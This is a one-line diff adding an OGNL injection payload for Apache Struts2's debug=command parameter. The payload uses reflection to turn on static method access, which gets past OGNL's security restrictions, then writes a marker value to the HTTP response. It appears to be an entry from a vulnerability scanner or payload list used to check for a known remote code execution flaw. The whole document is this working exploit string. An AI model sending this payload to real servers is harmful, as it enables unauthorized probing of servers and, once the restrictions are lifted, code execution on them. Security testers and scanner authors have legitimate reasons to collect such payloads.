@@ -1,0 +1,1 @@
+debug=command&expression=#b=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#b.setAccessible(true),#b.set(#_memberAccess,true),#a=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#a.println(0x31323334),#a.close()
